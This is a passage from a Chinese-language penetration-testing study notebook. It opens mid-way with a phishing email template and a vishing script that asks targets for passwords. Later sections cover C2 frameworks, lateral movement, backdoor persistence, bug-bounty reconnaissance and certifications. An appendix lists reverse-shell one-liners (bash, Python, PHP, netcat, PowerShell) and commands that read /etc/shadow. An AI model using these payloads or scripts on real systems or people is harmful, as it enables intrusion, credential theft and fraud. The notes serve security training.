我们检测到您的账户存在异常活动。为了保护您的账户安全，
请点击以下链接验证您的身份：

[验证链接]

如果您没有进行任何操作，请忽略此邮件。

此致
安全团队

# 使用 SET (Social Engineering Toolkit)
sudo setoolkit
# 选择 1) Social-Engineering Attacks
# 选择 2) Website Attack Vectors
# 选择 3) Credential Harvester Attack Method
```

#### 13.2.2 电话钓鱼（Vishing）

```
电话钓鱼脚本示例：

"您好，我是 [公司名] IT 部门的 [名字]。
我们正在进行系统升级，需要验证您的账户信息。
请问您方便提供一下您的用户名和密码吗？
这是为了确保升级后您能正常登录系统。"

常用借口：
- IT 支持/系统升级
- 安全审计
- 密码重置
- 账户验证
- 调查问卷
```

### 13.3 C2 框架

C2（Command and Control）框架用于管理被控制的目标系统。

```bash
# Cobalt Strike（商业）
# 业界最流行的红队 C2 框架

# Metasploit
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
exploit -j

# Sliver（开源）
# 安装
curl https://sliver.sh/install | sudo bash

# 启动
sliver-server

# 生成 Implant
generate --mtls 192.168.1.50 --os windows --arch amd64 --save implant.exe

# 启动监听器
mtls --lhost 0.0.0.0 --lport 443

# Havoc（开源）
# 现代化的 C2 框架
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc
make

# Empire（开源）
# PowerShell 后渗透框架
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
./setup/install.sh
./empire
```

### 13.4 横向移动技术

```bash
# Pass-the-Hash
# 使用 Mimikatz
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:hash /run:cmd.exe

# 使用 Impacket
python3 psexec.py -hashes :ntlm_hash administrator@192.168.1.100
python3 wmiexec.py -hashes :ntlm_hash administrator@192.168.1.100
python3 smbexec.py -hashes :ntlm_hash administrator@192.168.1.100

# Pass-the-Ticket
# 导出票据
sekurlsa::tickets /export

# 导入票据
kerberos::ptt ticket.kirbi

# 使用票据
dir \\server\share

# Over-Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:hash /run:powershell.exe

# DCSync 攻击
# 需要域管理员权限或复制权限
lsadump::dcsync /domain:corp.local /user:Administrator

# 使用 Impacket
python3 secretsdump.py corp.local/admin:password@dc.corp.local

# Golden Ticket
# 获取 krbtgt 哈希后
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt

# Silver Ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /target:server.corp.local /service:cifs /rc4:hash /ptt
```

### 13.5 持久化技术

```bash
# Windows 持久化

# 注册表启动项
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# 计划任务
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM

# WMI 事件订阅
# 使用 PowerShell
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "Backdoor"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12"
}

$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "Backdoor"
    CommandLineTemplate = "C:\backdoor.exe"
}

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}

# DLL 劫持
# 找到可劫持的 DLL
# 放置恶意 DLL 到程序目录

# Linux 持久化

# Cron 任务
echo "* * * * * /tmp/backdoor" >> /var/spool/cron/crontabs/root

# SSH 密钥
echo "ssh-rsa AAAA... attacker@kali" >> /root/.ssh/authorized_keys

# 修改 .bashrc
echo "/tmp/backdoor &" >> /root/.bashrc

# Systemd 服务
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
ExecStart=/tmp/backdoor
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor
systemctl start backdoor
```

---

## 14. 漏洞赏金猎人

### 14.1 漏洞赏金平台

| 平台 | 特点 | 网址 |
|------|------|------|
| HackerOne | 最大的漏洞赏金平台 | hackerone.com |
| Bugcrowd | 第二大平台 | bugcrowd.com |
| Synack | 精英平台，需要审核 | synack.com |
| Intigriti | 欧洲平台 | intigriti.com |
| YesWeHack | 欧洲平台 | yeswehack.com |
| 漏洞盒子 | 国内平台 | vulbox.com |
| 补天 | 国内平台 | butian.net |
| CNVD | 国家漏洞库 | cnvd.org.cn |

### 14.2 漏洞赏金技巧

```bash
# 1. 选择合适的目标
# - 新上线的项目
# - 范围广的项目
# - 赏金高的项目
# - 竞争少的项目

# 2. 信息收集是关键
# 子域名枚举
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -o amass_results.txt
cat subdomains.txt amass_results.txt | sort -u > all_subdomains.txt

# 存活检测
httpx -l all_subdomains.txt -o alive.txt

# 端口扫描
nmap -iL alive.txt -p- --min-rate=1000 -oA nmap_results

# 目录枚举
for domain in $(cat alive.txt); do
    gobuster dir -u $domain -w wordlist.txt -o "gobuster_$domain.txt"
done

# 3. 自动化工作流
# 使用 Nuclei 进行漏洞扫描
nuclei -l alive.txt -t nuclei-templates/ -o nuclei_results.txt

# 使用 Jaeles 进行扫描
jaeles scan -s signatures/ -U alive.txt -o jaeles_results

# 4. 关注低垂果实
# - 子域名接管
# - 敏感信息泄露
# - 开放重定向
# - CORS 配置错误
# - 信息泄露

# 5. 深入测试
# - 业务逻辑漏洞
# - 权限绕过
# - 竞态条件
# - 二次注入
```

### 14.3 漏洞报告写作

```markdown
# 漏洞报告模板

## 标题
[漏洞类型] - [受影响的功能/端点]

## 摘要
简要描述漏洞及其影响。

## 严重程度
Critical / High / Medium / Low

## 受影响的资产
- URL: https://example.com/vulnerable-endpoint
- 参数: id

## 漏洞描述
详细描述漏洞的技术细节。

## 复现步骤
1. 访问 https://example.com/login
2. 输入用户名和密码
3. 拦截请求
4. 修改参数 id 为 ' OR '1'='1
5. 观察响应

## 概念验证（PoC）
```
POST /api/user HTTP/1.1
Host: example.com
Content-Type: application/json

{"id": "1' OR '1'='1"}
```

## 影响
描述漏洞可能造成的影响：
- 数据泄露
- 账户接管
- 等等

## 修复建议
1. 使用参数化查询
2. 实施输入验证
3. 等等

## 参考资料
- OWASP SQL Injection
- CWE-89

## 附件
- 截图
- 视频
- 脚本
```

---

## 15. 职业发展与认证

### 15.1 安全认证路线图

```
┌─────────────────────────────────────────────────────────────────┐
│                    安全认证路线图                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   入门级                                                        │
│   ├── CompTIA Security+                                        │
│   ├── CEH (Certified Ethical Hacker)                           │
│   └── eJPT (eLearnSecurity Junior Penetration Tester)          │
│                                                                 │
│   中级                                                          │
│   ├── OSCP (Offensive Security Certified Professional)         │
│   ├── eCPPT (eLearnSecurity Certified Professional PT)         │
│   ├── GPEN (GIAC Penetration Tester)                           │
│   └── CRTP (Certified Red Team Professional)                   │
│                                                                 │
│   高级                                                          │
│   ├── OSEP (Offensive Security Experienced Penetration Tester) │
│   ├── OSWE (Offensive Security Web Expert)                     │
│   ├── OSED (Offensive Security Exploit Developer)              │
│   ├── CRTO (Certified Red Team Operator)                       │
│   └── GXPN (GIAC Exploit Researcher and Advanced PT)           │
│                                                                 │
│   专家级                                                        │
│   ├── OSCE3 (OSEP + OSWE + OSED)                               │
│   └── CREST CRT/CCT                                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 15.2 OSCP 备考指南

OSCP（Offensive Security Certified Professional）是渗透测试领域最受认可的认证之一。

```bash
# OSCP 备考资源

# 1. 官方课程 PWK (Penetration Testing with Kali Linux)
# 包含 PDF 教材、视频和实验环境

# 2. 练习平台
# - HackTheBox (推荐 OSCP-like 机器)
# - TryHackMe (OSCP 学习路径)
# - VulnHub (免费靶机)
# - Proving Grounds (Offensive Security 官方)

# 3. 必备技能
# - 信息收集
# - 漏洞利用
# - 缓冲区溢出
# - 权限提升
# - 报告写作

# 4. 考试技巧
# - 时间管理（24小时）
# - 先做简单的机器
# - 详细记录每一步
# - 截图！截图！截图！
# - 不要放弃

# 5. 报告模板
# 使用官方模板或社区模板
# 包含所有复现步骤和截图
```

### 15.3 职业发展建议

```
┌─────────────────────────────────────────────────────────────────┐
│                    职业发展建议                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   技术提升                                                      │
│   ├── 持续学习新技术和漏洞                                      │
│   ├── 参与 CTF 比赛                                            │
│   ├── 阅读安全研究论文                                          │
│   ├── 关注安全社区和博客                                        │
│   └── 实践！实践！实践！                                        │
│                                                                 │
│   建立声誉                                                      │
│   ├── 参与漏洞赏金项目                                          │
│   ├── 发表技术博客                                              │
│   ├── 在安全会议上演讲                                          │
│   ├── 开发开源安全工具                                          │
│   └── 获取 CVE 编号                                            │
│                                                                 │
│   软技能                                                        │
│   ├── 报告写作能力                                              │
│   ├── 沟通表达能力                                              │
│   ├── 团队协作能力                                              │
│   └── 项目管理能力                                              │
│                                                                 │
│   职业路径                                                      │
│   ├── 安全工程师 → 高级安全工程师 → 安全架构师                  │
│   ├── 渗透测试员 → 红队成员 → 红队负责人                        │
│   ├── 安全研究员 → 首席研究员 → 安全顾问                        │
│   └── 独立漏洞赏金猎人 → 安全创业                               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 16. 常见错误与解决方案

### 16.1 工具使用错误

| 错误 | 原因 | 解决方案 |
|------|------|----------|
| `nmap: command not found` | 未安装 nmap | `sudo apt install nmap` |
| `Permission denied` | 需要 root 权限 | 使用 `sudo` |
| `Connection refused` | 目标端口未开放 | 确认目标服务运行 |
| `Timeout` | 网络问题或防火墙 | 检查网络连通性 |
| `SSL certificate problem` | 证书验证失败 | 添加 `-k` 或 `--insecure` 参数 |

### 16.2 渗透测试常见错误

```bash
# 错误 1：未获得授权就进行测试
# 后果：违法！可能面临法律诉讼
# 解决：始终获得书面授权

# 错误 2：测试范围超出授权
# 后果：可能影响非目标系统
# 解决：严格遵守测试范围

# 错误 3：未备份就修改系统
# 后果：可能造成不可恢复的损坏
# 解决：测试前备份，使用非破坏性方法

# 错误 4：忘记清理测试痕迹
# 后果：留下安全隐患
# 解决：测试后清理所有后门和测试文件

# 错误 5：报告不够详细
# 后果：客户无法复现和修复
# 解决：详细记录每一步，包含截图

# 错误 6：使用过时的工具和技术
# 后果：错过漏洞或被检测
# 解决：保持工具和知识更新

# 错误 7：只依赖自动化工具
# 后果：错过逻辑漏洞
# 解决：结合手动测试

# 错误 8：忽视信息收集
# 后果：错过攻击面
# 解决：花足够时间进行信息收集
```

### 16.3 编程常见错误

```python
# Python 常见错误

# 错误 1：编码问题
# UnicodeDecodeError: 'utf-8' codec can't decode byte
# 解决：
response = requests.get(url)
response.encoding = response.apparent_encoding
# 或
text = data.decode('utf-8', errors='ignore')

# 错误 2：SSL 证书验证
# SSLError: certificate verify failed
# 解决：
import urllib3
urllib3.disable_warnings()
requests.get(url, verify=False)

# 错误 3：超时处理
# 解决：
try:
    response = requests.get(url, timeout=10)
except requests.exceptions.Timeout:
    print("Request timed out")
except requests.exceptions.RequestException as e:
    print(f"Error: {e}")

# 错误 4：并发问题
# 解决：使用线程池
from concurrent.futures import ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(scan_function, targets)
```

```bash
# Bash 常见错误

# 错误 1：变量未加引号
# 问题：文件名包含空格时出错
# 解决：
for file in "$directory"/*; do
    echo "$file"
done

# 错误 2：命令替换
# 旧语法：`command`
# 新语法（推荐）：$(command)

# 错误 3：条件判断
# 问题：[ $var = "value" ] 当 var 为空时出错
# 解决：
[ "$var" = "value" ]
# 或使用 [[ ]]
[[ $var = "value" ]]

# 错误 4：管道错误处理
# 问题：管道中的错误被忽略
# 解决：
set -o pipefail
```

---

## 17. 学习资源与社区

### 17.1 推荐书籍

| 书名 | 作者 | 适合阶段 |
|------|------|----------|
| 《Web应用安全权威指南》 | 德丸浩 | 入门 |
| 《黑客攻防技术宝典：Web实战篇》 | Dafydd Stuttard | 入门-中级 |
| 《Metasploit渗透测试指南》 | David Kennedy | 入门-中级 |
| 《The Hacker Playbook 3》 | Peter Kim | 中级 |
| 《Red Team Field Manual》 | Ben Clark | 中级-高级 |
| 《The Web Application Hacker's Handbook》 | Dafydd Stuttard | 中级-高级 |
| 《Hacking: The Art of Exploitation》 | Jon Erickson | 高级 |
| 《Practical Malware Analysis》 | Michael Sikorski | 高级 |

### 17.2 在线学习平台

| 平台 | 特点 | 网址 |
|------|------|------|
| HackTheBox | 实战靶机 | hackthebox.com |
| TryHackMe | 引导式学习 | tryhackme.com |
| PortSwigger Web Security Academy | Web 安全 | portswigger.net/web-security |
| PentesterLab | 渗透测试 | pentesterlab.com |
| Offensive Security | OSCP 等认证 | offensive-security.com |
| SANS | 专业培训 | sans.org |
| Cybrary | 免费课程 | cybrary.it |

### 17.3 安全社区

```
推荐关注的社区和资源：

Twitter/X 账号：
- @_johnhammond
- @ippsec
- @NahamSec
- @staboratory
- @TomNomNom
- @Jhaddix

YouTube 频道：
- IppSec
- John Hammond
- LiveOverflow
- NetworkChuck
- The Cyber Mentor

博客：
- PortSwigger Research Blog
- Project Zero Blog
- Hackerone Hacktivity
- Medium Security Tags

论坛：
- Reddit r/netsec
- Reddit r/AskNetsec
- Reddit r/bugbounty
- 0x00sec

中文社区：
- 先知社区
- FreeBuf
- 安全客
- 看雪论坛
- 吾爱破解
```

### 17.4 CTF 资源

```bash
# CTF 平台
# - CTFtime.org (比赛日历)
# - PicoCTF (入门)
# - OverTheWire (入门)
# - pwnable.kr (PWN)
# - cryptopals.com (密码学)
# - Root-Me (综合)
# - XCTF (国内)

# CTF 工具
# 综合工具
- CyberChef (数据处理)
- Ghidra (逆向)
- pwntools (PWN)
- z3 (约束求解)

# Web 工具
- Burp Suite
- sqlmap
- dirsearch

# Crypto 工具
- hashcat
- john
- RsaCtfTool

# Forensics 工具
- Autopsy
- Volatility
- binwalk
- foremost

# Steganography 工具
- steghide
- zsteg
- stegsolve
```

---

## 附录：快速参考

### 常用命令速查

```bash
# 信息收集
nmap -sS -sV -O -A target
gobuster dir -u http://target -w wordlist.txt
subfinder -d target.com

# Web 测试
sqlmap -u "http://target/page?id=1" --batch
nikto -h http://target
wpscan --url http://target

# 密码破解
john --wordlist=rockyou.txt hashes.txt
hashcat -m 0 hashes.txt rockyou.txt
hydra -l admin -P passwords.txt target ssh

# 漏洞利用
msfconsole
searchsploit keyword

# 后渗透
# Linux
find / -perm -4000 2>/dev/null
sudo -l
cat /etc/passwd
cat /etc/shadow

# Windows
whoami /all
net user
systeminfo
```

### 常用 Payload

```bash
# 反向 Shell

# Bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
nc -e /bin/sh 10.0.0.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

> 本笔记持续更新中，最后更新：2025年12月
> 
> 免责声明：本笔记仅供安全研究和学习使用。
> 未经授权对他人系统进行测试是违法行为。
> 请遵守当地法律法规，做一名合法的白帽黑客。
